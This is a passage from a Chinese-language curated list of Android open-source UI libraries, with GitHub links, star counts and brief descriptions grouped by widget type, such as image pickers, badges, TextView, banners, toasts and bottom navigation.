[FishBun](https://github.com/sangcomz/FishBun) ★273 - Android图片选择器 \n- [Android-BitherCompress](https://github.com/jeanboydev/Android-BitherCompress) ★272 - Android图片压缩目前最优解决方案 \n- [XLowPoly](https://github.com/xyzxqs/XLowPoly) ★242 - low poly图片的安卓实现 \n- [AlbumSelector](https://github.com/lijunguan/AlbumSelector) ★222 - 图片选择库 \n- [imagepickerdemo](https://github.com/fengyongge/imagepickerdemo) ★216 - 图片选择器 \n- [HotImg](https://github.com/dreamlivemeng/HotImg) ★211 - 图片不规则区域点击事件处理 \n- [GalleryPick](https://github.com/YancyYe/GalleryPick) ★207 - Android 自定义相册 \n- [JigsawDemo](https://github.com/newtonker/JigsawDemo) ★206 - Android的拼图Demo \n- [PullDownView](https://github.com/w4lle/PullDownView) ★198 - 下拉展示大图 \n- [collageview](https://github.com/lopei/collageview) ★181 - 创建简单照片拼贴 \n- [FrescoUtils](https://github.com/CarGuo/FrescoUtils) ★147 - 图片处理 \n- [croperino](https://github.com/ekimual/croperino) ★146 - 简单的图像裁剪工具 \n- [ImageCropper](https://github.com/Jhuster/ImageCropper) ★143 - 图片裁剪库 \n- [FrescoImageView](https://github.com/HomHomLin/FrescoImageView) ★141 - Android平台的图像控件 \n- [MutiPhotoChoser](https://github.com/laomengzhu/MutiPhotoChoser) ★139 - 支持多选的图片选择器 \n- [android-image-picker](https://github.com/esafirm/android-image-picker) ★112 - 选择图像的简单的库 \n- [ImageLoaderUtil](https://github.com/soulrelay/ImageLoaderUtil) ★96 - ImageLoaderUtil实现的图集功能 \n- [ImageLoader](https://github.com/libin7278/ImageLoader) ★90 - 基于Glide的二次封装 \n- [SnappyImageViewer](https://github.com/nshmura/SnappyImageViewer) ★80 - 安卓图片视图 \n- [litho-picasso](https://github.com/charbgr/litho-picasso) ★79 - 仿Picasso的图片组件兼容 \n- [ImageLoader](https://github.com/hss01248/ImageLoader) ★74 - 图片加载框架的api封装 \n- [PicCrop](https://github.com/hss01248/PicCrop) ★68 - 对ucrop的封装工具类 \n- [ImageZoom](https://github.com/okaybroda/ImageZoom) ★52 - 仿Instagram的视图缩放功能 \n- [ImagePickerWithCrop](https://github.com/Tofira/ImagePickerWithCrop) ★51 - 指定选择图片的库 \n- [Multimager](https://github.com/vansikrishna/Multimager) ★49 - 多图片选择器和多图片捕获 \n- [ImageFrame](https://github.com/Mr-wangyong/ImageFrame) ★48 - 高效省内存的播放序列帧控件 \n- [LQRImagePicker](https://github.com/GitLqr/LQRImagePicker) ★42 - 完全仿微信的图片选择 \n- [IKNinePhotoView](https://github.com/Idtk/IKNinePhotoView) ★42 - 开源的Android九宫格控件 \n- [ImageSelector](https://github.com/huzhenjie/ImageSelector) ★33 - 支持多图选择和图片预览的图片选择器 \n- [PictureSelectorLight](https://github.com/LuckSiege/PictureSelectorLight) ★26 - 多图选择器 \n- [KrGallery](https://github.com/chengzichen/KrGallery) ★26 - 图片处理库 \n- [AlxPicassoProgress](https://github.com/AlexZhuo/AlxPicassoProgress) ★26 - 图片下载进度实时显示 \n- [ImageEditor](https://github.com/yangzhidan/ImageEditor) ★16 - 仿QQ图片编辑器 \n\n## 徽章(Badge) \n\n- [BGABadgeView-Android](https://github.com/bingoogolapple/BGABadgeView-Android) ★1680 - Android 徽章控件 \n- [BadgeView](https://github.com/qstumn/BadgeView) ★1375 - 自由定制的BadgeView \n- [Android-ActionItemBadge](https://github.com/mikepenz/Android-ActionItemBadge) ★1094 - 为ActionItem添加标识 \n- [MaterialBadgeTextView](https://github.com/matrixxun/MaterialBadgeTextView) ★891 - 展示新的信息标识和新的特色标识 \n- [Badger](https://github.com/volders/Badger) ★722 - 添加徽章 \n- [Badge](https://github.com/nekocode/Badge) ★640 - 一系列徽章图片 \n- [BadgeView](https://github.com/AlexLiuSheng/BadgeView) ★473 - 基于Android的BadeView \n- [badgebutton](https://github.com/czy1121/badgebutton) ★347 - 带有徽标(数字，小红点)的按钮 \n- [NotificationBadge](https://github.com/nex3z/NotificationBadge) ★84 - 带有动画的通知标记 \n- [BadgeRadioButton](https://github.com/hcs-xph/BadgeRadioButton) ★25 - 仿QQ底部Tab切换RadioButton \n- [SuperBadge](https://github.com/chendongde310/SuperBadge) ★19 - 消息红点计数解决方案 \n\n## RatingView \n\n- [MaterialRatingBar](https://github.com/DreaminginCodeZH/MaterialRatingBar) ★830 - 性能更好的MD风格的RatingBar \n- [SimpleRatingBar](https://github.com/FlyingPumba/SimpleRatingBar) ★639 - 简单但功能强大的RatingBar \n- [SmileyRating](https://github.com/sujithkanna/SmileyRating) ★638 - Android简单的评级栏 \n- [SpiderWebScoreView](https://github.com/xiaopansky/SpiderWebScoreView) ★574 - 蛛网评分控件 \n- [SimpleRatingBar](https://github.com/ome450901/SimpleRatingBar) ★370 - 一个简单的自定义动画的评分组件 \n- [SimpleRatingView](https://github.com/xiprox/SimpleRatingView) ★167 - Android的评价切换 \n- [AndroidCustomView](https://github.com/AllenCoder/AndroidCustomView) ★127 - 简单的投票排名对比图 \n- [rating-request](https://github.com/iamhabib/rating-request) ★24 - 简单的Android对话框 \n\n## 滚动效果(Scroll) \n\n- [Android-ObservableScrollView](https://github.com/ksoichiro/Android-ObservableScrollView) ★7579 - 观察滚动事件和滚动视图的Android库 \n- [AndroidScrollingImageView](https://github.com/Q42/AndroidScrollingImageView) ★1208 - 安卓视差动画效果 \n- [Scrollable](https://github.com/noties/Scrollable) ★892 - 封装实现滚动条的滚动逻辑 \n- [material-scrolling](https://github.com/satorufujiwara/material-scrolling) ★580 - MD风格的滚动效果安卓库 \n- [MaterialScrollBar](https://github.com/turing-tech/MaterialScrollBar) ★568 - 为MD5.1之前的版本带来MD5.1的滚动条 \n- [ScrollLayout](https://github.com/yingLanNull/ScrollLayout) ★215 - 场景抽屉拖拽效果 \n- [HVScrollView](https://github.com/LuckyJayce/HVScrollView) ★46 - 配置水平和垂直滚动的HVScrollView \n\n## 时间轴 \n\n- [Timeline-View](https://github.com/vipulasri/Timeline-View) ★1220 - 时间线视图库 \n- [TimelineView](https://github.com/alorma/TimelineView) ★888 - 在应用程序添加时间轴的安卓视图 \n- [TimelineView](https://github.com/qapqap/TimelineView) ★409 - Android自定义时间线视图 \n- [UnderLineLinearLayout](https://github.com/razerdp/UnderLineLinearLayout) ★276 - 一个简单的时间轴实现 \n- [TimeLine](https://github.com/vienan/TimeLine) ★254 - 安卓时间轴 \n\n## TreeView \n\n- [AndroidTreeView](https://github.com/bmelnychuk/AndroidTreeView) ★1692 - 安卓的目录视图 \n- [RecyclerTreeView](https://github.com/TellH/RecyclerTreeView) ★167 - 安卓的TreeView实现 \n- [TreeView](https://github.com/shineM/TreeView) ★102 - 树形结构组件 \n\n## SearchView \n\n- [MaterialSearchView](https://github.com/MiguelCatalan/MaterialSearchView) ★2230 - 以MD风格实现SearchView \n- [floatingsearchview](https://github.com/arimorty/floatingsearchview) ★2074 - 带有搜索建议的浮动搜索栏 \n- [JJSearchViewAnim](https://github.com/android-cjj/JJSearchViewAnim) ★1968 - 炫酷的SearchView搜索动画库 \n- [SearchView](https://github.com/lapism/SearchView) ★1535 - 类似Play Store的SearchView \n- [FloatingSearchView](https://github.com/renaudcerrato/FloatingSearchView) ★1215 - 浮动的搜索视图实现 \n- [MaterialSearchBar](https://github.com/mancj/MaterialSearchBar) ★1014 - 安卓MD风格搜索栏 \n- [Search-View-Layout](https://github.com/sahildave/Search-View-Layout) ★891 - Lollipop+ Dialer和Google Maps的实现 \n- [MaterialSearchView](https://github.com/Mauker1/MaterialSearchView) ★731 - 基于MD风格的Android搜索视图 \n- [Material-SearchTransition](https://github.com/alexstyl/Material-SearchTransition) ★324 - 展示如何过渡到搜索的示例项目 \n- [QueryHighlighter](https://github.com/cyrilmottier/QueryHighlighter) ★254 - 在文本中突出搜索字词 \n- [search-dialog](https://github.com/mirrajabi/search-dialog) ★188 - 快速和自定义的搜索对话框 \n- [searchablespinner](https://github.com/michaelprimez/searchablespinner) ★97 - 搜索器 \n- [MsvSearch](https://github.com/claudiodegio/MsvSearch) ★94 - Material Design风格搜索视图 \n- [SearchDialog](https://github.com/wenwenwen888/SearchDialog) ★89 - 仿bilibili搜索框效果 \n- [LSearchView](https://github.com/onlynight/LSearchView) ★30 - Android L设计搜索视图 \n\n## TagView \n\n- [ChipsLayoutManager](https://github.com/BelooS/ChipsLayoutManager) ★1716 - 自定义RecyclerView布局管理器 \n- [FlowLayout](https://github.com/nex3z/FlowLayout) ★952 - 让子视图自动浮动到下一行 \n- [SimpleTagImageView](https://github.com/wujingchao/SimpleTagImageView) ★822 - 安卓中带有标签的ImageView \n- [AndroidTagView](https://github.com/whilu/AndroidTagView) ★798 - Android TagView库 \n- [materialChipView](https://github.com/robertlevonyan/materialChipView) ★684 - MD风格的Chip视图 \n- [AutoLabelUI](https://github.com/DavidPizarro/AutoLabelUI) ★591 - 将标签并排放置的Android库 \n- [android-tagview](https://github.com/kaedea/android-tagview) ★580 - 云标签控件 \n- [TriangleRectangleLabelView](https://github.com/Frank-Zhu/TriangleRectangleLabelView) ★448 - 标签视图 \n- [TagViewGroup](https://github.com/shellljx/TagViewGroup) ★434 - Android 仿小红书图片标签 \n- [EasyTagDragView](https://github.com/wenhuaijun/EasyTagDragView) ★228 - 仿网易新闻app下拉标签选择菜单 \n- [ChannelTagView](https://github.com/yilylong/ChannelTagView) ★51 - 一个频道管理view \n- [FlowLayoutDemo](https://github.com/PingerOne/FlowLayoutDemo) ★23 - 自定义View实现流式布局 \n- [LaybelLayout](https://github.com/paulyung541/LaybelLayout) ★22 - 标签布局 \n\n## TextView \n\n- [HTextView](https://github.com/hanks-zyh/HTextView) ★3129 - 支持自定义字体的TextView动画效果 \n- [android-autofittextview](https://github.com/grantland/android-autofittextview) ★2785 - 自动改变文字大小完美适应边界 \n- [ticker](https://github.com/robinhood/ticker) ★2463 - 显示滚动文本 \n- [ExpandableTextView](https://github.com/Manabu-GT/ExpandableTextView) ★2298 - 展开/折叠TextView \n- [TextJustify-Android](https://github.com/bluejamesbond/TextJustify-Android) ★1490 - 文本处理库 \n- [RichText](https://github.com/zzhoujay/RichText) ★1472 - Android富文本解析器 \n- [SuperTextView](https://github.com/lygttpod/SuperTextView) ★1335 - 功能强大的TextView \n- [SlantedTextView](https://github.com/HeZaiJin/SlantedTextView) ★1258 - 倾斜的TextView \n- [Android-TextView-LinkBuilder](https://github.com/klinker24/Android-TextView-LinkBuilder) ★1165 - 创建可点击的链接 \n- [TextLayoutBuilder](https://github.com/facebookincubator/TextLayoutBuilder) ★1124 - Facebook出品的在Android中轻松实现文字布局 \n- [ReadMoreTextView](https://github.com/borjabravo10/ReadMoreTextView) ★1053 - 装饰文本的自定义TextView \n- [SuperTextView](https://github.com/chenBingX/SuperTextView) ★1000 - 提高构建项目的效率 \n- [TokenAutoComplete](https://github.com/splitwise/TokenAutoComplete) ★999 - 安卓Gmail风格的MultiAutoCompleteTextView \n- [html-textview](https://github.com/SufficientlySecure/html-textview) ★929 - 扩展的安卓TextView组件 \n- [FadingTextView](https://github.com/rosenpin/FadingTextView) ★866 - 自动改变其内容的TextView \n- [RotatingText](https://github.com/sdsmdg/RotatingText) ★845 - 周期性文本更新库 \n- [AutoLinkTextView](https://github.com/armcha/AutoLinkTextView) ★835 - 自动检测并处理点击事件 \n- [Android-RobotoTextView](https://github.com/johnkil/Android-RobotoTextView) ★760 - TextView及其直接间接子类的实现 \n- [AutoFitTextView](https://github.com/AndroidDeveloperLB/AutoFitTextView) ★674 - 自动适应字体和行计数的TextView \n- [BabushkaText](https://github.com/quiqueqs/BabushkaText) ★659 - 通过Spannables设置文本样式 \n- [FloatingText](https://github.com/UFreedom/FloatingText) ★626 - 执行漂浮效果动画的控件 \n- [TriangleLabelView](https://github.com/shts/TriangleLabelView) ★587 - 显示三角视图 \n- [android-justifiedtextview](https://github.com/ufo22940268/android-justifiedtextview) ★580 - 基于原生TextView实现合理的textview \n- [Trestle](https://github.com/lawloretienne/Trestle) ★542 - 在TextView上桥接span \n- [android-chips](https://github.com/klinker41/android-chips) ★531 - 基于Google的内部chip库的简易库 \n- [ExpandableTextView](https://github.com/Chen-Sir/ExpandableTextView) ★493 - 展开折叠TextView \n- [Markdown](https://github.com/zzhoujay/Markdown) ★485 - Android原生Markdown解析器 \n- [html-builder](https://github.com/jrummyapps/html-builder) ★435 - 为Android TextView建立有效的HTML \n- [AvatarLabelView](https://github.com/yanbober/AvatarLabelView) ★424 - 可配置的迷你版轻量级 Label 辅助类 \n- [SimpleText](https://github.com/jaychang0917/SimpleText) ★422 - 简化spannable字符串的创建 \n- [dante](https://github.com/fourlastor/dante) ★419 - 文本解析器 \n- [cornerlabelview](https://github.com/czy1121/cornerlabelview) ★396 - 视图角标 \n- [NumberAnimTextView](https://github.com/Bakumon/NumberAnimTextView) ★381 - 数字增加动画的 TextView \n- [text-decorator](https://github.com/nntuyen/text-decorator) ★367 - 轻松装饰TextView \n- [UnderLineLinkTextView](https://github.com/wangshaolei/UnderLineLinkTextView) ★327 - 使关键词带有可点击的下划线TextView \n- [XRichText](https://github.com/limedroid/XRichText) ★279 - 显示Html富文本的TextView \n- [PinchZoomTextView](https://github.com/androidessence/PinchZoomTextView) ★272 - 用手势缩放字体大小 \n- [Better-Link-Movement-Method](https://github.com/Saketme/Better-Link-Movement-Method) ★231 - 在TextView中处理RUL \n- [ColorTextView](https://github.com/zhonghanwen/ColorTextView) ★214 - 用颜色标记一些短语 \n- [FlexibleRichTextView](https://github.com/daquexian/FlexibleRichTextView) ★200 - 自行定义大部分标签 \n- [CompoundIconTextView](https://github.com/AAkira/CompoundIconTextView) ★183 - 带有icon的TextView \n- [GetWordTextView](https://github.com/burgessjp/GetWordTextView) ★168 - 通过点击获得词语 \n- [MoreTextView](https://github.com/Xander1024/MoreTextView) ★129 - TextView的“展开”和“收起” \n- [RandomTextView](https://github.com/AndroidMsky/RandomTextView) ★116 - 滚动显示TextView的数字 \n- [TagEditText](https://github.com/limedroid/TagEditText) ★115 - 显示类似微博中的活动标签 \n- [CharCountTextView](https://github.com/xbroak/CharCountTextView) ★114 - 仿Twitter剩余长度计数器 \n- [RickText](https://github.com/CarGuo/RickText) ★98 - 类似微博的编辑框 \n- [nachos](https://github.com/hootsuite/nachos) ★59 - 输入文本并创建MD风格的chip \n- [Zaman](https://github.com/Morxander/Zaman) ★54 - 将timestamp转化为时间String \n- [SpanEZ](https://github.com/yombunker/SpanEZ) ★39 - 从Spannable API完成提取 \n- [TextViewDrawable](https://github.com/ithedan/TextViewDrawable) ★37 - 仿大众点评的购买须知 \n- [RichTextView](https://github.com/githubwing/RichTextView) ★37 - 富文本textview \n- [TextViewSpanLink](https://github.com/loonggg/TextViewSpanLink) ★30 - TextView上展示超链接 \n- [SpanBuilder](https://github.com/zrq1060/SpanBuilder) ★19 - TextView可以生成的span样式 \n\n## EditText \n\n- [MaterialEditText](https://github.com/rengwuxian/MaterialEditText) ★4215 - MD风格的EditText \n- [Android Form EditText](https://github.com/vekexasia/android-edittext-validator) ★1234 - 为edittext带来数据有效性工具 \n- [MaterialTextField](https://github.com/florent37/MaterialTextField) ★1029 - 与众不同的漂亮的浮动可编辑文本框 \n- [BufferTextInputLayout](https://github.com/bufferapp/BufferTextInputLayout) ★818 - 简单的TextImputLayout定制化服务 \n- [BiuEditText](https://github.com/xujinyang/BiuEditText) ★600 - 一个有趣的EditText \n- [MentionEditText](https://github.com/luckyandyzhang/MentionEditText) ★352 - 为提及的字符串添加一些有用的功能特色 \n- [AndroidEdit](https://github.com/qinci/AndroidEdit) ★334 - EditText的撤销和恢复撤销操作 \n- [TyperEditText](https://github.com/andyxialm/TyperEditText) ★314 - 打字机效果 \n- [AnFQNumEditText](https://github.com/FTandJYQ/AnFQNumEditText) ★251 - 自定义EditText实现右下角计数控件 \n- [AutoFillEmailEditText](https://github.com/wangshaolei/AutoFillEmailEditText) ★247 - 自动对EditText添加自定义email \n- [PowerfulViewLibrary](https://github.com/chaychan/PowerfulViewLibrary) ★155 - 输入框功能 \n- [LineHeightEditText](https://github.com/hanks-zyh/LineHeightEditText) ★141 - 修复文本编辑行高和光标效果 \n- [EditCard](https://github.com/Morxander/EditCard) ★78 - 输入信用卡号码的自定义EditText \n- [FloatingEditText](https://github.com/rafakob/FloatingEditText) ★62 - TextInputLayout和TextInputEditText合并成一个类 \n- [EasyMoney-Widgets](https://github.com/wajahatkarim3/EasyMoney-Widgets) ★32 - 支持货币显示的部件 \n- [RichEditText](https://github.com/aishang5wpj/RichEditText) ★24 - 仿微博富文本编辑框 \n- [PhoneMask](https://github.com/vacxe/PhoneMask) ★22 - 添加手机号可读性的EditText \n- [EditTextTools](https://github.com/AndroidMsky/EditTextTools) ★13 - 输入整数小数位数限制自动加逗号 \n\n## Sliding \n\n- [AndroidSlidingUpPanel](https://github.com/umano/AndroidSlidingUpPanel) ★6303 - 通过向上拖动添加额外面板 \n- [SlideUp-Android](https://github.com/mancj/SlideUp-Android) ★1263 - 对任何视图添加边侧效果 \n- [DiscreteSlider](https://github.com/lawloretienne/DiscreteSlider) ★542 - 让用户在指定的刻度线上选择一个值的滑块 \n- [slideview](https://github.com/MAXDeliveryNG/slideview) ★485 - 简单独特的Android滑动按钮 \n- [SlidingLayout](https://github.com/HomHomLin/SlidingLayout) ★384 - 安卓平台View控件 \n- [SlidingBall](https://github.com/dalong982242260/SlidingBall) ★199 - 仿QQ身边的人的效果 \n\n## 表单 \n\n- [android-saripaar](https://github.com/ragunathjawahar/android-saripaar) ★2292 - 基于规则的AndroidUI输入验证库 \n- [hover](https://github.com/google/hover) ★2025 - Android浮动菜单实现 \n- [MaterialLogin](https://github.com/fanrunqi/MaterialLogin) ★1525 - MD风格的登录效果 \n- [MaterialChipsInput](https://github.com/pchmn/MaterialChipsInput) ★1502 - MD风格chip组件的实现 \n- [GridPasswordView](https://github.com/Jungerr/GridPasswordView) ★1262 - Android密码视图 \n- [AndroidKeyboardWatcher](https://github.com/AzimoLabs/AndroidKeyboardWatcher) ★770 - Android可开闭输入键盘 \n- [AwesomeValidation](https://github.com/thyrlian/AwesomeValidation) ★747 - 实现对Android的验证 \n- [MaterialLogin](https://github.com/shem8/MaterialLogin) ★695 - MD风格的登录注册视图 \n- [material-code-input](https://github.com/glomadrian/material-code-input) ★668 - MD样式的编码输入 \n- [passwordview](https://github.com/lisawray/passwordview) ★666 - Android密码视图 \n- [PasswordLoadingView](https://github.com/Rogero0o/PasswordLoadingView) ★537 - 当完成密码时显示一个动画 \n- [OnePageSigninSignup](https://github.com/irfaan008/OnePageSigninSignup) ★447 - 单页面实现注册登录 \n- [SwipeCaptcha](https://github.com/mcxtzhang/SwipeCaptcha) ★403 - Android 平台的滑动验证码 \n- [data-binding-validator](https://github.com/Ilhasoft/data-binding-validator) ★226 - 使验证字段变得简单而快速 \n- [Ratifier](https://github.com/Hamadakram/Ratifier) ★114 - Android表单验证库 \n- [ValidationUtilsLibrary](https://github.com/sgaikar1/ValidationUtilsLibrary) ★92 - 实现表单验证 \n- [AutoInputAuthCode](https://github.com/xiong-it/AutoInputAuthCode) ★41 - 自动填写验证码功能库 \n- [social-login-helper](https://github.com/mukeshsolanki/social-login-helper) ★33 - 将社交登录整合到应用中 \n\n## 分段控件 \n\n- [android-segmented-control](https://github.com/Kaopiz/android-segmented-control) ★1363 - Android自定义视图 \n- [SHSegmentControl](https://github.com/7heaven/SHSegmentControl) ★471 - 一个简单的SegmentControl部件 \n- [segmentedview](https://github.com/czy1121/segmentedview) ★31 - ios 风格的分段控件 \n- [SegmentedControl](https://github.com/danledian/SegmentedControl) ★16 - 分段选择控件 \n\n## 轮播图 \n\n- [Android-ConvenientBanner](https://github.com/saiwu-bigkoo/Android-ConvenientBanner) ★2733 - 通用的广告栏控件 \n- [banner](https://github.com/youth5201314/banner) ★2694 - Android广告图片轮播控件 \n- [BGABanner-Android](https://github.com/bingoogolapple/BGABanner-Android) ★1773 - 引导界面滑动导航 \n- [android-pile-layout](https://github.com/xmuSistone/android-pile-layout) ★1210 - 堆叠滑动控件 \n- [carouselview](https://github.com/sayyam/carouselview) ★608 - Android轮播框库 \n- [CarouselPicker](https://github.com/GoodieBag/CarouselPicker) ★475 - 轮播图选择器 \n- [SuperIndicator](https://github.com/hejunlin2013/SuperIndicator) ★397 - 首页推荐位轮播图 \n- [XBanner](https://github.com/xiaohaibin/XBanner) ★358 - 自定义图片无限轮播的控件 \n- [BannerLayout](https://github.com/dongjunkun/BannerLayout) ★280 - 简洁实用的android广告栏 \n- [bannerview](https://github.com/czy1121/bannerview) ★200 - 横幅广告图片轮播控件 \n- [MZBannerView](https://github.com/pinguo-zhouwei/MZBannerView) ★193 - 仿魅族BannerView \n- [RecyclerViewBanner](https://github.com/loonggg/RecyclerViewBanner) ★159 - 使用RecyclerView做的轮播图 \n- [AndroidCarrouselLayout](https://github.com/dalong982242260/AndroidCarrouselLayout) ★115 - 安卓轮播框布局 \n- [Banner-Slider](https://github.com/saeedsh92/Banner-Slider) ★66 - 在Android应用中便于使用的精致滑块 \n- [MaterialBanner](https://github.com/rtugeek/MaterialBanner) ★58 - MD风格的banner \n- [Flare](https://github.com/IntruderShanky/Flare) ★56 - 简单的循环指示器实现 \n- [RecyclerBanner](https://github.com/13456961183/RecyclerBanner) ★28 - 使用RecyclerView 实现的轮播图 \n- [simplebanner](https://github.com/genius158/simplebanner) ★16 - 基于adapter的轮播图实现 \n\n## 文件操作 \n\n- [Android Upload Service](https://github.com/gotev/android-upload-service) ★1218 - 轻松实现后台上传文件 \n- [AmazeFileManager](https://github.com/arpitkh96/AmazeFileManager) ★1209 - 好用的文件管理源代码 \n- [Android-FilePicker](https://github.com/DroidNinja/Android-FilePicker) ★1103 - 灵活选择图片和视频的文件选择器 \n- [MaterialFilePicker](https://github.com/nbsp-team/MaterialFilePicker) ★613 - MD风格文件选择器库 \n- [ThinDownloadManager](https://github.com/smanikandan14/ThinDownloadManager) ★603 - Android下载文件库 \n- [NoNonsense-FilePicker](https://github.com/spacecowboy/NoNonsense-FilePicker) ★539 - 文件选择器库 \n- [AndroidPDF](https://github.com/lidong1665/AndroidPDF) ★62 - PDF文件打开方法 \n- [Android-FileBrowser-FilePicker](https://github.com/adityak368/Android-FileBrowser-FilePicker) ★27 - Android文件浏览器文件选择器 \n\n## 启动页 \n\n- [Welcome](https://github.com/stephentuso/welcome-android) ★1300 - 安卓欢迎屏效果 \n- [Particle](https://github.com/JeasonWong/Particle) ★1063 - 酷炫动画效果 \n- [WowSplash](https://github.com/githubwing/WowSplash) ★731 - 铁塔融云闪屏页 \n- [AwesomeSplash](https://github.com/ViksaaSkool/AwesomeSplash) ★584 - 令人叫绝的可自定义的飞溅效果屏幕 \n- [WelcomeVideoPager](https://github.com/linglongxin24/WelcomeVideoPager) ★93 - Android酷炫欢迎页播放视频 \n\n## MD \n\n- [MaterialDesignLibrary](https://github.com/navasmdc/MaterialDesignLibrary) ★8213 - Material Design 安卓库 \n- [RippleEffect](https://github.com/traex/RippleEffect) ★4235 - MD风格的点击涟漪效果实现 \n- [material-ripple](https://github.com/balysv/material-ripple) ★1832 - Android视图的纹波效果封装 \n- [Carbon](https://github.com/ZieIony/Carbon) ★1654 - Android的MD风格实现案例 \n- [JFoenix](https://github.com/jfoenixadmin/JFoenix) ★1312 - 使用Java组件实现Google的MD风格 \n- [MaterialShadows](https://github.com/harjot-oberai/MaterialShadows) ★981 - 支持 convex material阴影库 \n- [MaterialValues](https://github.com/AoDevBlue/MaterialValues) ★711 - 将Material Design指南中的所有值在资源中定义 \n- [RippleDrawable](https://github.com/ozodrukh/RippleDrawable) ★498 - Android<ripple>效果端口 \n- [MaterialMasterDetail](https://github.com/lurbas/MaterialMasterDetail) ★242 - 实现Master及Detail模式 \n- [RippleLayout](https://github.com/liuguangqiang/RippleLayout) ★208 - 实现波纹效果的布局 \n- [material-element](https://github.com/takahirom/material-element) ★163 - MD风格动画示例APP \n- [MaterialTransitionAnimation](https://github.com/Cutta/MaterialTransitionAnimation) ★102 - MD风格动画实践 \n\n## BottomNavigation \n\n- [BottomBar](https://github.com/roughike/BottomBar) ★6349 - 自定义视图组件 \n- [NavigationTabBar](https://github.com/DevLight-Mobile-Agency/NavigationTabBar) ★3088 - 带有色彩交互的导航标签栏 \n- [ahbottomnavigation](https://github.com/aurelhubert/ahbottomnavigation) ★2098 - 实现MD风格的按钮导航组件库 \n- [BottomNavigation](https://github.com/Ashok-Varma/BottomNavigation) ★2047 - 从GooglePlay商店获取示例apk \n- [Space-Navigation-View](https://github.com/armcha/Space-Navigation-View) ★1305 - 仿GoogleSpaces的导航完全整合 \n- [Material-BottomNavigation](https://github.com/sephiroth74/Material-BottomNavigation) ★907 - 轻量级底部导航库组件 \n- [LuseenBottomNavigation](https://github.com/armcha/LuseenBottomNavigation) ★851 - 底部导航视图 \n- [AdaptableBottomNavigation](https://github.com/bufferapp/AdaptableBottomNavigation) ★528 - 又一个Bottom Navigation实现 \n- [AlphaTabsIndicator](https://github.com/yingLanNull/AlphaTabsIndicator) ★492 - 高仿微信底部状态栏的轻量级库 \n- [BottomNavigationViewEx](https://github.com/ittianyu/BottomNavigationViewEx) ★437 - 增强BottomNavigationView的安卓库 \n- [JPTabBar](https://github.com/peng8350/JPTabBar) ★412 - 安卓标签栏 \n- [BottomNavigationBar](https://github.com/RoyWallace/BottomNavigationBar) ★257 - MD更新的BottomNavigationbar的开源实现 \n- [BottomNavBar](https://github.com/adib2149/BottomNavBar) ★141 - 轻松添加四个选项卡的导航栏 \n- [BottomTabView](https://github.com/ifmvo/BottomTabView) ★27 - 自定义实现主流底部 Tab 菜单 View \n\n## Toast \n\n- [Toasty](https://github.com/GrenderG/Toasty) ★2703 - 通常的Toast \n- [SuperToasts](https://github.com/JohnPersano/SuperToasts) ★2300 - 增强并创建立Android Toast库 \n- [TastyToast](https://github.com/yadav-rahul/TastyToast) ★1493 - 精致的原生安卓toast \n- [loadtoast](https://github.com/code-mc/loadtoast) ★1254 - Android可自定义toast \n- [StyleableToast](https://github.com/Muddz/StyleableToast) ★1124 - 标准安卓Toast \n- [Sneaker](https://github.com/Hamadakram/Sneaker) ★430 - 自定义alert的轻量级安卓库 \n- [SweetTips](https://github.com/HuanHaiLiuXin/SweetTips) ★59 - 快意灵动的提示库 \n- [LovelyToast](https://github.com/anderson9/LovelyToast) ★36 - 使你的Toast变得灵活而生动 \n\n## CreditCard \n\n- [CreditSesameRingView](https://github.com/HotBitmapGG/CreditSesameRingView) ★939 - 仿Ali芝麻信用新老环形界面 \n- [CreditCardView](https://github.com/sharish/CreditCardView) ★717 - 支付系统信用卡和签账卡视图 \n- [SwipeableCard](https://github.com/michelelacorte/SwipeableCard) ★592 - 仿StreetView磁卡实现 \n- [CreditCardView](https://github.com/vinaygaba/CreditCardView) ★590 - 仿真信用卡UI安卓库 \n- [CreditCardEntry](https://github.com/dbachelder/CreditCardEntry) ★456 - 进行信用卡输入的表单 \n- [android-sumbit-credit-card-flow](https://github.com/adonixis/android-sumbit-credit-card-flow) ★415 - MD风格的信用卡格式实现 \n- [EditCard](https://github.com/Morxander/EditCard) ★78 - 输入信用卡号码的自定义EditText \n- [CardForm](https://github.com/geeckmc/CardForm) ★23 - Android信用卡借记卡互动表单 \n\n## ActionSheet \n\n- [SlideBottomPanel](https://github.com/kingideayou/SlideBottomPanel) ★687 - 实现知乎日报β版底部划出视图 \n- [android-ActionSheet](https://github.com/baoyongzhang/android-ActionSheet) ★664 - 仿照iOS UIActionSheet组件 \n- [TedBottomPicker](https://github.com/ParkSangGwon/TedBottomPicker) ★596 - 简单的图片选择器 \n- [BottomSheet](https://github.com/Kennyc1012/BottomSheet) ★508 - 安卓BottomSheet风格的对话框 \n- [BottomSheets](https://github.com/android-cjj/BottomSheets) ★334 - BottomSheets控件的使用 \n- [BottomDialogDemo](https://github.com/SpikeKing/BottomDialogDemo) ★206 - 使用 DialogFragment 实现底部弹窗布局 \n\n## Wave \n\n- [WaveLoading](https://github.com/race604/WaveLoading) ★1094 - 能够提供波浪动画的Drawable \n- [WaveView](https://github.com/john990/WaveView) ★1010 - Android波浪视图 \n- [WaveView](https://github.com/gelitenight/WaveView) ★957 - 显示波浪效果的视图 \n- [MusicWave](https://github.com/akshay2211/MusicWave) ★283 - 音乐的波纹 \n- [WaveView](https://github.com/1139618418/WaveView) ★108 - 有趣的水波纹效果的界面 \n- [RippleLayout](https://github.com/SouthernBox/RippleLayout) ★61 - 使用 drawBitmapMesh 实现仿真水波纹效果 \n- [DxWaveRefresh](https://github.com/StevenDXC/DxWaveRefresh) ★34 - 波浪效果的下拉刷新 \n- [DiffuseView](https://github.com/Airsaid/DiffuseView) ★30 - 自定义的圆形扩散View \n- [BitmapWaveView](https://github.com/AndroidMsky/BitmapWaveView) ★17 - 在bitmap中显示进度波浪 \n\n## Snackbar \n\n- [TSnackBar](https://github.com/AndreiD/TSnackBar) ★620 - 从顶部显示一个Snackbar \n- [SnackbarUtils](https://github.com/HuanHaiLiuXin/SnackbarUtils) ★379 - Snackbar工具类 \n- [CookieBar](https://github.com/liuguangqiang/CookieBar) ★354 - 屏幕的底部或者顶部显示短信息 \n- [Snacky](https://github.com/matecode/Snacky) ★336 - 在布局中添加Snackbar \n- [Light](https://github.com/TonnyL/Light) ★180 - 更好的Snackbar实现 \n- [SweetTips](https://github.com/HuanHaiLiuXin/SweetTips) ★59 - 快意灵动的提示库 \n\n## 用户引导 \n\n- [TapTargetView](https://github.com/KeepSafe/TapTargetView) ★2663 - 用户引导功能的实现 \n- [TourGuide](https://github.com/worker8/TourGuide) ★2075 - 应用使用方法指导视图 \n- 